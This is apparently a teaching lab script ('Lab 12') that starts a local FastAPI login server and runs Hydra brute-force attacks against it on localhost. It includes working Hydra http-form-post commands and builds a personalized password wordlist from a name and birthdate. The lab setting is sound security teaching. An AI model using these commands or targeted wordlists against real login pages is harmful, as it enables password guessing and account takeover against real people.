#!/bin/bash
# Lab 12: Full brute-force demo
# 1. Start FastAPI server
# 2. Run Hydra against it

echo "=== Installing dependencies ==="
sudo apt update -q && sudo apt install -y hydra python3-venv

echo ""
echo "=== Setting up FastAPI server ==="
python3 -m venv /tmp/bf-venv
/tmp/bf-venv/bin/pip install -q "fastapi[standard]"

echo ""
echo "=== Starting server in background ==="
/tmp/bf-venv/bin/fastapi run main.py --port 8000 &
SERVER_PID=$!
sleep 3

echo ""
echo "=== Running Hydra brute-force ==="
hydra -f -I -V \
  -L usernames.txt \
  -P passwords.txt \
  -s 8000 localhost \
  http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"

echo ""
echo "=== Generating personalized wordlist (task) ==="
python3 wordlist_generator.py John Doe 01011990
echo ""
echo "Running Hydra with personalized wordlist..."
hydra -f -I \
  -l admin \
  -P victim_wordlist.txt \
  -s 8000 localhost \
  http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"

echo ""
echo "=== Cleanup ==="
kill $SERVER_PID 2>/dev/null
rm -rf /tmp/bf-venv victim_wordlist.txt
echo "Done."
